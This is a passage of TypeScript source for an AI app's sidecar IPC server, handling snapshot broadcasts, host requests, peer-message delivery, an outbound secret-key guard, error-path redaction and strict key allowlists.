   * NOT part of attach/replay.
   */
  private broadcastSessionTitle(title: string): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.send(connection, {
        kind: 'session-title',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        title,
      })
    }
  }

  /**
   * P4-5 — build + send the redacted accounts snapshot to one connection. Same
   * idiom as the other read-seams: `getSnapshot()` is a pure, throw-free read of
   * the live pool; the shared `send` path applies clone/JSON checks, the outbound
   * secret guard, and the size cap. Wrapped so a snapshot failure can never
   * strand the attaching connection.
   */
  private sendAccountsSnapshot(connection: Connection): void {
    if (!this.accounts) {
      return
    }
    try {
      const raw = this.accounts.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'accounts.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'accounts.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        accounts: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] accounts.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastAccountsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendAccountsSnapshot(connection)
    }
  }

  private async sendUsageStatsSnapshot(
    connection: Connection,
    range: UsageStatsRange = '7d',
  ): Promise<void> {
    try {
      // `tryGet…`, not the throw-free variant: its empty-snapshot fallback would
      // send zeros the read never measured, and the renderer draws those as
      // "No session activity recorded". Sending nothing leaves the page on its
      // last good value, or pending.
      const raw = await tryGetUsageStatsSnapshot(range)
      if (!raw) {
        this.log('[sidecar] stats.usage.snapshot skipped (usage stats read failed)')
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'stats.usage.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'stats.usage.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        stats: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] stats.usage.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-15 — broadcast one `oauth.login.progress` frame (the live sign-in
   * back-channel). Carries non-secret state only; `send()`'s secretGuard is the
   * proof (a token-keyed field would drop the whole frame). On `success` the
   * account has just been written engine-side, so re-broadcast the accounts
   * snapshot too, for BOTH the new-account (alias-submit) and re-link
   * (auto-persist) paths uniformly.
   *
   * That re-broadcast reaches the SESSION-scoped surfaces only. It does NOT move
   * the Accounts page or the account-health bar: both read the host-plane pool
   * (`selectGlobalAccountsSnapshot`), which prefers main's worker snapshot over
   * any session's, so a session frame cannot update them once main's first run
   * has landed. Main re-reads the pool itself on this frame
   * (`frameMutatedAccountsPool`, `app/main/mainDecisions.ts`).
   */
  private broadcastOAuthLoginProgress(progress: OAuthLoginProgress): void {
    if (this.connections.size === 0) {
      return
    }
    const frame: ServerFrame = {
      kind: 'oauth.login.progress',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      progress,
    }
    for (const connection of this.connections) {
      this.send(connection, frame)
    }
    if (progress.state === 'success') {
      this.broadcastAccountsSnapshot()
      // OAuth success changes credential-dependent model availability. Refresh
      // an already-open picker immediately instead of requiring a respawn or an
      // unrelated run-control mutation.
      this.broadcastRunControlsSnapshot()
    }
  }

  /**
   * One-shot: populate the pool's usage hints (accounts domain `refreshUsage` →
   * engine `fetchPoolUsage`, read-only) and re-broadcast the snapshot when real
   * usage lands. Guarded so it runs once per sidecar; the fetch itself is
   * 1-min-cached engine-side, though the post-turn poll invalidates that cache,
   * so in a busy session it is usually live. Fire-and-forget: any failure is
   * swallowed and the pre-fetch snapshot stands (never blocks attach or history
   * replay).
   */
  private refreshAccountsUsageOnce(): void {
    if (this.usageRefreshStarted || !this.accounts) {
      return
    }
    this.usageRefreshStarted = true
    void this.accounts
      .refreshUsage()
      .then(changed => {
        if (changed) {
          this.broadcastAccountsSnapshot()
        }
      })
      .catch(() => {})
  }

  /**
   * P4-15 — re-broadcast the workspace-trust snapshot after an accept persisted
   * (`trusted:true`), so every attached connection's gate clears. The read is
   * otherwise spawn-frozen; this is the ONE mutation path (mirrors the accounts
   * re-broadcast after a pool-changing verb).
   */
  private broadcastWorkspaceTrustSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendWorkspaceTrustSnapshot(connection)
    }
  }

  /**
   * P4-14 — build + send the workspace-trust snapshot to one connection.
   * Spawn-time-frozen like settings: `getSnapshot()` is a pure read, no live
   * re-broadcast (a workspace switch spawns a new sidecar at the new cwd).
   */
  private sendWorkspaceTrustSnapshot(connection: Connection): void {
    if (!this.workspaceTrust) {
      return
    }
    try {
      const raw = this.workspaceTrust.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'workspace-trust.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'workspace-trust.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        workspaceTrust: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] workspace-trust.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-14 — build + send the diagnostics snapshot to one connection.
   * Spawn-time-frozen like settings: `getSnapshot()` is a pure read, no live
   * re-broadcast (the doctor/install checks run once at spawn).
   */
  private sendDiagnosticsSnapshot(connection: Connection): void {
    if (!this.diagnostics) {
      return
    }
    try {
      const raw = this.diagnostics.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'diagnostics.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'diagnostics.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        diagnostics: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] diagnostics.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-13 — build + send the RemoteSettings snapshot (bridge status + real
   * command-filter truth) to one connection. Same idiom as the other read-seams:
   * `getSnapshot()` is a pure, throw-free read; the shared `send` path applies
   * clone/JSON checks, the outbound secret guard, and the size cap.
   */
  private sendRemoteSettingsSnapshot(connection: Connection): void {
    if (!this.remoteSettings) {
      return
    }
    try {
      const raw = this.remoteSettings.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'remoteSettings.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'remoteSettings.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        remoteSettings: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] remoteSettings.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastRemoteSettingsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendRemoteSettingsSnapshot(connection)
    }
  }

  /**
   * P4-19 — re-emit the (now-refreshed) settings snapshot to every attached
   * connection after a write lands, so the value editors and provenance badges
   * reflect the persisted change without a reconnect.
   */
  private broadcastSettingsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendSettingsSnapshot(connection)
    }
  }

  /* --------------------------------------------------------------------- *
   * HOST-REQUEST-PLANE (decisions/HOST-REQUEST-PLANE.md) — this sidecar's half.
   *
   * The one direction where this process is the CLIENT: it mints a request id,
   * emits `host.request` outbound, and waits for main's `host.result` on the
   * same id. Outbound rides the ordinary `send`, so `secretGuard` runs on the
   * request like every other frame (HR7); inbound is validated here at the trust
   * boundary like every other inbound kind (HR5).
   * --------------------------------------------------------------------- */

  /**
   * Ask main to do one bounded thing. Resolves with main's typed answer, or with
   * a typed local failure — NEVER hangs, and never throws at the caller.
   *
   * `requestId` is minted HERE and echoed on the result (the T5a analog
   * `history.loadEarlier.result` already uses). Nothing about the id authorizes
   * anything: it correlates one pending call and is forgotten on settle.
   */
  async requestHost<V extends HostRequestVerb>(
    verb: V,
    args: HostRequestArgs[V],
  ): Promise<HostRequestOutcome<V>> {
    if (this.connections.size === 0 || this.closed) {
      return {
        ok: false,
        error: { code: 'unavailable', message: 'not connected to the host' },
      }
    }
    const requestId = randomUUID()
    const frame: ServerFrame = {
      kind: 'host.request',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId,
      verb,
      args,
    }
    return new Promise<HostRequestOutcome<V>>(resolve => {
      const timer = setTimeout(() => {
        // Settle, then forget: a late result for this id then matches nothing
        // and is dropped and logged, which is the designed behaviour (§2) rather
        // than a second resolution of a settled promise.
        this.pendingHostRequests.delete(requestId)
        resolve({
          ok: false,
          error: { code: 'timeout', message: 'the host did not answer in time' },
        })
      }, HOST_REQUEST_TIMEOUT_MS)
      timer.unref?.()
      this.pendingHostRequests.set(requestId, {
        // Narrowing is safe and checked: the entry carries the schema for the
        // verb it was minted for, and `handleHostResult` parses `value` against
        // it before settling, so a result whose shape does not match the verb
        // that asked for it never reaches this resolve.
        settle: outcome => resolve(outcome as HostRequestOutcome<V>),
        timer,
        valueSchema: HOST_RESULT_VALUE_SCHEMAS[verb],
      })
      let sent = false
      for (const connection of this.connections) {
        this.send(connection, frame)
        sent = true
      }
      if (!sent) {
        clearTimeout(timer)
        this.pendingHostRequests.delete(requestId)
        resolve({
          ok: false,
          error: { code: 'unavailable', message: 'not connected to the host' },
        })
      }
    })
  }

  /** HR5 — main's answer to one request this sidecar minted an id for. */
  private handleHostResult(message: unknown): void {
    const parsed = hostResultEnvelopeSchema.safeParse(message)
    if (!parsed.success) {
      // No `sendError`: this frame answers a request, so there is no renderer
      // click to retire, and the only honest record is the log line. The pending
      // entry stays until its own timeout settles it.
      this.log(
        `[sidecar] rejected host.result: ${
          parsed.error.issues[0]?.message ?? 'invalid message'
        }`,
      )
      return
    }
    const pending = this.pendingHostRequests.get(parsed.data.requestId)
    if (!pending) {
      // §2 — "a result whose id matches no pending request is dropped and logged
      // at the sidecar". This is also where a result that arrives after its own
      // timeout lands, which is why it is a log line and not an error.
      this.log('[sidecar] dropped host.result for an unknown request id')
      return
    }
    this.pendingHostRequests.delete(parsed.data.requestId)
    clearTimeout(pending.timer)
    if (parsed.data.ok) {
      // HR5 — the value is validated against the schema for the verb THIS
      // request asked for. A well-formed envelope carrying the wrong shape is a
      // failure the caller is told about, not something handed on for a tool to
      // discover by reading a field that is not there.
      const value = pending.valueSchema.safeParse(parsed.data.value)
      if (!value.success) {
        this.log(
          `[sidecar] rejected host.result value: ${
            value.error.issues[0]?.message ?? 'invalid value'
          }`,
        )
        pending.settle({
          ok: false,
          error: {
            code: 'internal_error',
            message: 'the host answered with an unexpected shape',
          },
        })
        return
      }
      pending.settle({
        ok: true,
        value: value.data as HostRequestValues[HostRequestVerb],
      })
      return
    }
    pending.settle({
      ok: false,
      error: {
        code: hostRequestErrorCode(parsed.data.error?.code),
        message: parsed.data.error?.message ?? 'the host refused the request',
      },
    })
  }

  

  /**
   * HR5 / §4 step 4 — one peer message, routed by main.
   *
   * It enters the engine command queue at `next` priority ON THE
   * TASK-NOTIFICATION PATH, never the prompt path: `enqueueMidTurnPrompt` stages
   * a `mode:'prompt'` command into the renderer's waiting-messages strip, which
   * would show a peer message as something the USER typed and hand it to the
   * user's own recall controls. A busy recipient reads this at the next tool
   * boundary (`src/query.ts`), an idle one starts a turn from
   * `drainOneTaskNotification`.
   *
   * `MessageOrigin` kind `peer` is the engine's own (`src/types/message.ts`), so
   * the provenance the transcript records is structural rather than sniffed out
   * of the text — the same discriminant `toSDKMessageOriginProp` carries to the
   * renderer for every other injected turn.
   *
   * Ack = ENQUEUED (§4 step 6). The ack goes back the moment the command is on
   * the queue, because that is the point past which this process will deliver it
   * or die trying; main holds the message until then and re-sends it after this
   * row's next `ready` if the process exits first.
   */
  private handlePeerDeliver(connection: Connection, message: unknown): void {
    const parsed = peerDeliverMessageSchema.safeParse(message)
    if (!parsed.success) {
      this.sendError(
        connection,
        undefined,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid peer message',
        false,
      )
      return
    }
    const delivered = parsed.data
    const origin: MessageOrigin = {
      kind: 'peer',
      name: delivered.from,
      appSessionId: delivered.fromSessionId,
    }
    enqueuePendingNotification({
      value: delivered.untagged === true
        ? delivered.text
        : wrapCrossSessionMessage(delivered.from, delivered.text),
      mode: 'task-notification',
      // §4 step 4 — `next`, ahead of worker results, behind a human prompt.
      priority: 'next',
      origin,
    })
    // Enqueued: tell main it may forget the message. Fire-and-forget by
    // necessity (this handler is synchronous, and the ack's own result carries
    // nothing a caller acts on), but never silent — a failed ack is logged, and
    // its only cost is one duplicate row after a restore, the crash window §4
    // step 6 accepts.
    void this.requestHost('peer.ack', { messageId: delivered.messageId }).then(
      outcome => {
        if (!outcome.ok) {
          this.log(`[sidecar] peer message ack failed: ${outcome.error.code}`)
        }
      },
    )
  }

  /**
   * §4 step 4a's surviving half — publish this session's presence when it
   * CHANGES, so main can answer "is Bear busy, stuck, or done" without ever
   * reading engine event vocabulary.
   *
   * Both inputs are read from the SAME two sources the `ready` payload is built
   * from (`controller.getPendingPermissionRequests()` and the turn flags), which
   * is what makes the value at attach and the value on change the same fact
   * rather than two derivations that can disagree.
   *
   * `needs_user` outranks `running` because a peer waiting on a permission
   * prompt is the case a creator most needs to see, and it is not "busy". It
   * holds while the pending set is NON-EMPTY rather than flipping on the first
   * resolve, so two prompts answered out of order cannot report the session free
   * while one is still open — the engine keeps them in a map, and this reads its
   * size.
   */
  private currentPresence(): ActivityPresence {
    if (this.controller.getPendingPermissionRequests().length > 0) return 'needs_user'
    if (this.activeTurn || this.controller.isTurnActive()) return 'running'
    return 'idle'
  }

  private sendActivity(connection: Connection, presence: ActivityPresence): void {
    this.send(connection, {
      kind: 'activity',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      presence,
    })
  }

  /** Broadcast presence if, and only if, it moved. */
  private publishActivity(): void {
    if (this.connections.size === 0) return
    const presence = this.currentPresence()
    if (presence === this.lastPublishedPresence) return
    this.lastPublishedPresence = presence
    for (const connection of this.connections) {
      this.sendActivity(connection, presence)
    }
  }

  private send(connection: Connection, frame: ServerFrame): void {
    // F6 — outbound secret-key assertion on EVERY frame (events AND ready). The
    // engine is the sole secret owner; a token key must never cross IPC. This is
    // separate from JSON-safety (a token object is valid JSON). An error frame
    // is exempt (it is sidecar-authored and carries no session payload) to avoid
    // an infinite loop if the guard itself needs to report.
    if (frame.kind !== 'error') {
      const secret = scanForSecrets(frame)
      if (!secret.ok) {
        this.log(
          `[sidecar] BLOCKED outbound frame carrying secret key "${secret.key}" at ${secret.path} (F6)`,
        )
        // The offending key/path stays on stderr: the durable record gets the
        // kind and the mechanism only.
        this.onFrameDropped?.('secret_key', frame.kind)
        this.sendError(
          connection,
          undefined,
          'internal_error',
          'outbound frame blocked: contained a credential field',
          false,
        )
        return
      }
    }

    const trace = this.wrapOutboundFrame
      ? mintDeliveryTrace(
        ++this.deliverySequence,
        this.deliveryStreamEpoch,
        this.deliveryProcessInstanceId,
        undefined,
        undefined,
        connection.deliveryConnectionEpoch,
      )
      : null
    // These are emitted before encoding and write, respectively.  They are not
    // reconstructed by Electron after receipt, so a failed encode/write leaves
    // an honest causal trail.
    if (trace) {
      this.onDeliveryStage?.(trace, 'engine.produced', frame.kind)
      this.onDeliveryStage?.(trace, 'sidecar.received', frame.kind)
    }

    let encoded: Buffer
    try {
      const payload = this.wrapOutboundFrame
        ? this.wrapOutboundFrame(frame, trace!)
        : frame
      encoded = encodeFrame(payload)
      // The delivery envelope is metadata-only and optional by contract, so it
      // must never cost a frame its delivery. A raw frame that fits below the
      // cap keeps its place on the wire; only the trace is dropped.
      if (encoded.byteLength > MAX_OUTBOUND_FRAME_BYTES && payload !== frame) {
        const bare = encodeFrame(frame)
        if (bare.byteLength <= MAX_OUTBOUND_FRAME_BYTES) {
          encoded = bare
          // Main mints a fresh trace for an envelope-less frame, so the stages
          // already emitted here and the ones recorded there describe the same
          // delivery under two ids. Main records that distinctly when it mints
          // one. This line is live-debugging detail only: it reaches the
          // descriptor through the legacy path, which keeps a category and drops
          // the text, so the durable record does not distinguish this from any
          // other sidecar failure. Source-side attribution needs its own
          // category or delivery stage, which neither vocabulary has yet.
          this.log(
            `[sidecar] delivery envelope dropped for oversize frame kind=${frame.kind}: trace overflow, source and host stages will not share a trace id`,
          )
        }
      }
    } catch (error) {
      this.log(
        `[sidecar] failed to encode frame kind=${frame.kind}: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
      this.onFrameDropped?.('encode_failed', frame.kind)
      return
    }

    // Sanity bound on outbound size (F3): trusted engine output may be large,
    // but a runaway is dropped rather than allowed to grow unbounded.
    if (encoded.byteLength > MAX_OUTBOUND_FRAME_BYTES) {
      this.log(
        `[sidecar] dropped oversized outbound frame kind=${frame.kind} (${encoded.byteLength} > ${MAX_OUTBOUND_FRAME_BYTES})`,
      )
      this.onFrameDropped?.('oversize', frame.kind)
      return
    }

    try {
      if (trace) this.onDeliveryStage?.(trace, 'sidecar.socket.queued', frame.kind)
      connection.socket.write(encoded, () => {
        if (trace) this.onDeliveryStage?.(trace, 'sidecar.socket.sent', frame.kind)
      })
    } catch (error) {
      this.log(
        `[sidecar] write failed, dropping connection: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
      this.removeConnection(connection)
      try {
        connection.socket.end()
      } catch {
        // The connection is already inert. Transport teardown is best-effort.
      }
    }
  }

  /**
   * Error frames are the ONE outbound kind `send` exempts from the secret-key
   * guard (loop avoidance, see `send`), and several call sites forward raw
   * engine text — `String(error)` from a rejected verb. A failed vault unlink
   * carries the vault file path in its message, and `vaultFilePath` is a
   * SECURITY-MINIMUM §4 forbidden crossing. The guard would not have caught it
   * either way (it scans KEY names, not values), so bound the text and strip
   * absolute paths before it leaves.
   */
  /**
   * The one answer a submit gets (SubmitResultFrame). Unicast, like `sendError`:
   * it settles a copy held by the renderer that sent the submit, and no other
   * reader has one to settle.
   *
   * A submit with no `submitId` gets no answer, because there is no id to address
   * it with. That is every non-renderer caller (the boundary drain, a probe) plus
   * any renderer submit that keeps nothing back.
   */
  private answerSubmit(
    connection: Connection,
    submitId: string | undefined,
    outcome: { accepted: true } | { accepted: false; code: ErrorFrame['code'] },
  ): void {
    if (submitId === undefined) return
    this.send(connection, {
      kind: 'submit.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      submitId,
      accepted: outcome.accepted,
      ...(outcome.accepted ? {} : { code: outcome.code }),
    })
  }

  /**
   * A boundary rejection that may be refusing a SUBMIT: the error says why, and
   * the submit answer says which message it was. Used by the rejection sites that
   * run BEFORE `handleSubmit` (rate limit, strict keys, schema parse), where the
   * only thing known about the frame is its structure.
   *
   * The envelope checks (protocol version, session addressing) deliberately do
   * NOT call this: a frame that fails those is not speaking this sidecar's
   * protocol or is not addressed to it, so an answer frame buys nothing.
   */
  private rejectFrameWithSubmitAnswer(
    connection: Connection,
    payload: unknown,
    requestId: string | undefined,
    code: ErrorFrame['code'],
    message: string,
    retryable: boolean,
  ): void {
    this.sendError(connection, requestId, code, message, retryable)
    this.answerSubmit(connection, submitIdForRejectedFrame(payload), {
      accepted: false,
      code,
    })
  }

  private sendError(
    connection: Connection,
    requestId: string | undefined,
    code: Extract<ServerFrame, { kind: 'error' }>['code'],
    message: string,
    retryable: boolean,
  ): void {
    this.send(connection, {
      kind: 'error',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId,
      code,
      message: redactErrorMessage(message),
      retryable,
    })
  }

  private checkRate(connection: Connection): boolean {
    const now = Date.now()
    if (now < connection.rateWindowStart || now - connection.rateWindowStart >= RATE_WINDOW_MS) {
      connection.rateWindowStart = now
      connection.rateCount = 0
    }
    connection.rateCount += 1
    return connection.rateCount <= MAX_FRAMES_PER_WINDOW
  }
}

/**
 * Extract only the fixed-position correlation value from an otherwise rejected
 * frame. This deliberately precedes schema validation, so malformed verbs can
 * still settle their renderer-side pending state without trusting any action
 * field they carry.
 */
function requestIdForRejectedFrame(payload: unknown): string | undefined {
  if (typeof payload !== 'object' || payload === null) return undefined
  const message = (payload as { message?: unknown }).message
  if (typeof message !== 'object' || message === null) return undefined
  const requestId = (message as { requestId?: unknown }).requestId
  return typeof requestId === 'string' &&
    requestId.length > 0 &&
    requestId.length <= MAX_TEXT_FIELD_CHARS
    ? requestId
    : undefined
}

/**
 * The renderer's submit correlation id (SubmitOptions.submitId), validated
 * sidecar-locally rather than by the engine's shared `appClientMessageSchema`.
 *
 * It has to be a separate schema because the shared one is deliberately NOT
 * extended (the WS server shares it) and its `options` object STRIPS unknown
 * keys, so the parsed message the dispatcher receives has already lost this
 * field. Read it off the RAW message instead, with the same bound every other
 * renderer-minted id carries. Fail-closed: present-but-malformed rejects the
 * whole submit rather than dropping the field and leaving the renderer waiting
 * for an answer that would never be addressed.
 */
const submitCorrelationSchema = z.object({
  options: z
    .object({
      submitId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS).optional(),
    })
    .optional(),
})

/**
 * The submit correlation id of a frame that is being REJECTED before
 * `handleSubmit` could parse it (a rate limit, a strict-key violation, a schema
 * failure). Deliberately structural and permissive about everything else, like
 * `requestIdForRejectedFrame`: it lets a refused submit settle the renderer's
 * retained copy without trusting any other field the frame carries.
 */
function submitIdForRejectedFrame(payload: unknown): string | undefined {
  if (typeof payload !== 'object' || payload === null) return undefined
  const message = (payload as { message?: unknown }).message
  if (typeof message !== 'object' || message === null) return undefined
  if ((message as { type?: unknown }).type !== 'app.submit') return undefined
  const options = (message as { options?: unknown }).options
  if (typeof options !== 'object' || options === null) return undefined
  const submitId = (options as { submitId?: unknown }).submitId
  return typeof submitId === 'string' &&
    submitId.length > 0 &&
    submitId.length <= MAX_TEXT_FIELD_CHARS
    ? submitId
    : undefined
}

/**
 * Outbound bound on an error frame's `message`. Errors are diagnostics, not a
 * data channel; the full text still reaches the sidecar's own stderr log.
 */
const MAX_ERROR_MESSAGE_CHARS = 1_000

/**
 * A user prompt on the engine's command queue that THIS session owes a turn.
 * `agentId === undefined` addresses the main thread, matching the filter the
 * engine's own mid-turn drain applies (`src/query.ts:1641`), so a subagent's
 * queued work is never mistaken for the user's.
 *
 * Deliberately does NOT require a string value. A composer submit carrying an
 * image is a `ContentBlockParam[]` (`buildSubmitPrompt`), and `QueuedCommand`
 * `value` is the same union as `AppSessionPrompt`, so the array is a prompt
 * this session owes a turn exactly like the text case. Narrowing to strings
 * made all three consumers blind to it at once: the depth cap stopped counting
 * it (defeating the accumulation bound `MAX_QUEUED_PROMPTS` exists to impose),
 * the boundary drain stopped rescuing it, and the park gate stopped holding —
 * so a mid-turn image message the running turn never drained was broadcast to
 * the transcript and then silently lost. Its twin below stays string-only on
 * purpose: that one's payload becomes banner text.
 */
function isDeliverableParentPrompt(command: QueuedCommand): boolean {
  return command.mode === 'prompt' && command.agentId === undefined
}

/** Its twin for worker results: same addressing rule, different mode. */
function isDeliverableParentTaskNotification(command: QueuedCommand): boolean {
  return (
    command.mode === 'task-notification' &&
    command.agentId === undefined &&
    typeof command.value === 'string'
  )
}

/**
 * An absolute POSIX path appearing anywhere in an error string, optionally
 * wrapped in the quotes/brackets Node's `EACCES: … unlink '<path>'` messages
 * use. Requires a second `/` so a bare root token is not matched, and stops at
 * whitespace or a closing delimiter. A URL is not matched: it starts at its
 * scheme, not at a slash.
 */
const ABSOLUTE_PATH_PATTERN =
  /(^|[\s'"`([{<])(\/[^\s'"`)\]}>,]*\/[^\s'"`)\]}>,]*)/g

/** See `SidecarServer.sendError` — strip filesystem paths, then bound. */
function redactErrorMessage(message: string): string {
  const stripped = message.replace(
    ABSOLUTE_PATH_PATTERN,
    (_match, prefix: string) => `${prefix}<path>`,
  )
  return stripped.length > MAX_ERROR_MESSAGE_CHARS
    ? `${stripped.slice(0, MAX_ERROR_MESSAGE_CHARS)}…`
    : stripped
}

function promptText(prompt: AppSessionPrompt): string {
  if (typeof prompt === 'string') return prompt
  return prompt
    .flatMap(block => (block.type === 'text' ? [block.text] : []))
    .join('\n')
}

/**
 * The staged-row preview: `promptText(prompt).slice(0, maxChars)` without
 * building the fold first. A prompt may carry `MAX_PROMPT_BYTES` of text while
 * the preview keeps a few hundred characters of it, so folding the whole thing
 * on every snapshot build allocated the entire prompt to throw nearly all of it
 * away.
 *
 * It must agree with that fold exactly, so the separator is owned by "have I
 * passed a text block yet" rather than by the accumulator: image blocks are
 * dropped without a separator, and a text block that folds to nothing still
 * takes one. (The wire schema requires every text block to be non-empty, so
 * that last case is not reachable through `app.submit` today.)
 */
function promptPreviewText(prompt: AppSessionPrompt, maxChars: number): string {
  if (typeof prompt === 'string') return prompt.slice(0, maxChars)
  let out = ''
  let seenTextBlock = false
  for (const block of prompt) {
    if (block.type !== 'text') continue
    if (out.length >= maxChars) break
    if (seenTextBlock) out += '\n'
    seenTextBlock = true
    out += block.text.slice(0, maxChars - out.length)
  }
  return out
}

async function readGeneratedImageForPreview(
  filePath: string,
): Promise<Uint8Array | null> {
  const file = await open(filePath, 'r')
  try {
    const info = await file.stat()
    if (!info.isFile() || info.size > MAX_GENERATED_IMAGE_PREVIEW_BYTES) return null
    const bytes = Buffer.allocUnsafe(info.size)
    let offset = 0
    while (offset < bytes.length) {
      const read = await file.read(bytes, offset, bytes.length - offset, offset)
      if (read.bytesRead === 0) break
      offset += read.bytesRead
    }
    const overflow = Buffer.allocUnsafe(1)
    const extra = await file.read(overflow, 0, 1, offset)
    if (extra.bytesRead > 0) return null
    return bytes.subarray(0, offset)
  } finally {
    await file.close()
  }
}

function generatedImageToolUseIds(event: AppSessionEvent): string[] {
  if (event.type !== 'message' || event.message.type !== 'assistant') return []
  const content = event.message.message?.content
  if (!Array.isArray(content)) return []
  return content.flatMap(block =>
    typeof block === 'object' &&
    block !== null &&
    'type' in block &&
    block.type === 'tool_use' &&
    'name' in block &&
    block.name === 'GenerateImage' &&
    'id' in block &&
    typeof block.id === 'string'
      ? [block.id]
      : [],
  )
}

function generatedImageResult(event: AppSessionEvent): {
  toolUseId: string
  filePath: string
  mediaType: 'image/jpeg' | 'image/png' | 'image/webp'
} | null {
  if (event.type !== 'message' || event.message.type !== 'user') return null
  const content = event.message.message?.content
  if (!Array.isArray(content)) return null
  const toolUseResult = event.message.tool_use_result
  if (
    typeof toolUseResult !== 'object' ||
    toolUseResult === null ||
    Array.isArray(toolUseResult)
  ) {
    return null
  }
  const output = toolUseResult as Record<string, unknown>
  const filePath = output['filePath']
  const outputFormat = output['outputFormat']
  if (typeof filePath !== 'string') return null
  const mediaType =
    outputFormat === 'png'
      ? 'image/png'
      : outputFormat === 'jpeg'
        ? 'image/jpeg'
        : outputFormat === 'webp'
          ? 'image/webp'
          : null
  if (!mediaType) return null
  for (const block of content) {
    if (
      typeof block === 'object' &&
      block !== null &&
      'type' in block &&
      block.type === 'tool_result' &&
      'tool_use_id' in block &&
      typeof block.tool_use_id === 'string'
    ) {
      return { toolUseId: block.tool_use_id, filePath, mediaType }
    }
  }
  return null
}

/**
 * Narrow a host-minted error code to the closed union, so a caller matching on
 * `error.code` is matching a value the union actually contains. An unrecognised
 * code degrades to `internal_error` rather than being cast through.
 */
function hostRequestErrorCode(value: unknown): HostRequestErrorCode {
  return typeof value === 'string' &&
    (HOST_REQUEST_ERROR_CODES as readonly string[]).includes(value)
    ? (value as HostRequestErrorCode)
    : 'internal_error'
}

/**
 * What one `host.request` resolves to. Typed per verb so a caller narrows
 * against the verb it asked for; a local failure (`timeout`, `unavailable`)
 * arrives in the same closed shape as one main minted, so a caller has exactly
 * one thing to pattern-match and can never be left waiting.
 */
export type HostRequestOutcome<V extends HostRequestVerb> =
  | { ok: true; value: HostRequestValues[V] }
  | { ok: false; error: HostRequestError }

/**
 * PEER-SESSIONS §5 — the wrapping the decision records as WORK OWED: the tag
 * constant has existed in the engine with zero call sites, and this is its first
 * one. The auto-mode classifier's rule 8 treats anything so tagged as never user
 * intent, which is the whole point: a peer's request must not be able to lift a
 * boundary the peer could not lift itself (R6's permission-laundering rule).
 *
 * Only the ATTRIBUTE is escaped. The sender name is a pool word main stamped, so
 * it cannot contain a quote today, and escaping it is cheap insurance against
 * that ever changing. The BODY is left verbatim, matching how the engine already
 * renders teammate and channel messages: an escaped body would reach the model
 * as entity soup, and a body that forges a closing tag still arrives inside a
 * message the classifier has already been told came from another session.
 */
function wrapCrossSessionMessage(from: string, text: string): string {
  const attribute = from
    .replaceAll('&', '&amp;')
    .replaceAll('"', '&quot;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
  return `<${CROSS_SESSION_MESSAGE_TAG} from="${attribute}">\n${text}\n</${CROSS_SESSION_MESSAGE_TAG}>`
}

/**
 * F10 — strict per-type key allowlist. The reused Zod schemas strip unknown
 * keys; this rejects a frame that carries any key not in the renderer-facing
 * contract, at every renderer-controlled level: the message itself,
 * `app.submit.options` (rejecting `options.uuid`, which is engine-identity), and
 * `permission.response.response` (rejecting host-only escalations the Zod schema
 * still accepts — `deny.interrupt`, `allow.updatedPermissions`). Returns an error
 * string, or null if the shape is clean. Type/field VALUES are still validated by
 * the Zod parse afterward; this only enforces "no extra keys".
 */
function checkStrictKeys(message: unknown): string | null {
  if (typeof message !== 'object' || message === null || Array.isArray(message)) {
    return 'message must be an object'
  }
  const obj = message as Record<string, unknown>
  const type = obj.type

  const allowedByType = new Map<string, Set<string>>([
    ['app.submit', new Set(['type', 'requestId', 'prompt', 'options'])],
    ['app.abort', new Set(['type', 'requestId', 'reason'])],
